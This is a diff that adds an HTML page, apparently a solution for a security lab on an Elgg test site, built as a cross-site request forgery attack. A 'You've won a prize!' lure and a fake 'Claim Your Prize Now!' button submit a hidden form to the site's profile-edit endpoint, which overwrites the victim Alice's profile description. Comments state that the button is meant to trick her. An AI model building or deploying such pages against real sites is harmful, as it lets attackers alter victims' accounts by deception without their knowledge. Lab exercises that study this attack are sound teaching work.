@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>You've won a prize!</h1>
+    <p>Click the button below to claim it:</p>
+
+    <form 
+        action="http://www.xsslabelgg.com/profile/edit.php" 
+        method="POST"
+        style="display: none;"
+    >
+        <!-- Profile fields to modify -->
+        <input type="hidden" name="description" value="Boby is my Hero">
+        <input type="hidden" name="accesslevel[description]" value="2">
+        
+        <!-- Other required fields (prevents errors) -->
+        <input type="hidden" name="nickname" value="Alice">
+        <input type="hidden" name="email" value="alice@example.com">
+        
+        <!-- Auto-submit button (hidden) -->
+        <input type="submit" id="submitBtn">
+    </form>
+
+    <!-- Fake button to trick Alice into clicking -->
+    <button onclick="document.getElementById('submitBtn').click()">
+        Claim Your Prize Now!
+    </button>
+</body>
+</html>
